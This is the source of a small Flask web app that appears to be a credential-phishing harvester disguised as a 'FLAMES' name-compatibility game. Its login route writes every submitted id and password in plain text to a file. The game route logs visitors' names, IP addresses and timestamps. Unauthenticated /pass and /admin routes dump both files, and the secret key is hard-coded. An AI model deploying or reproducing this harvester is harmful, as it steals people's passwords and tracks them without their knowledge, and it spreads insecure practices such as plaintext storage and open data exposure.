from flask import Flask, request, render_template, redirect
from datetime import datetime
from utils import flamer
app = Flask(__name__)
app.config["SECRET_KEY"] = "ThisIsMe"
first_name = ""
second_name = ""


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        id = request.form.get("id")
        password = request.form.get("pass")
        with open("pass.txt", "a") as file:
            file.writelines(f"\nid : {id} pass: {password}")
            file.close()
        print(id, password)
        if password == "" or id == "":
            return redirect("/")
        return redirect(f"/l")
    return render_template("login.html")
@app.route("/l")
def load():
    return render_template("load.html")
@app.route("/flames", methods=["GET", "POST"])
def flame():
    if request.method == "POST":
        first_name = request.form.get("fname").lower()
        second_name = request.form.get("sname").lower()
        with open("./info.txt", "a") as f:
            f.writelines(
                        f"\nuser[{request.environ['REMOTE_ADDR']}][{datetime.now()}]\n  first name : {first_name} second_name : {second_name}"
                    )
            f.close()
        return  flamer(first_name, second_name)
    elif request.method == 'GET':
        return render_template("index.html")
@app.route("/s=<first_name>/<second_name>")
def share(first_name, second_name):
    return flamer(first_name, second_name)


@app.route("/<arg>")
def admin(arg):
    file = ""
    if arg == 'admin':
        file = "./info.txt"
        with open(file, "rb") as f:
             file = f.readlines()
             f.close()
    elif arg == 'pass':

        file = "./pass.txt"
        with open(file, "r") as f:
             file = f.readlines()
             f.close()

    return render_template("admin.html", file=file)
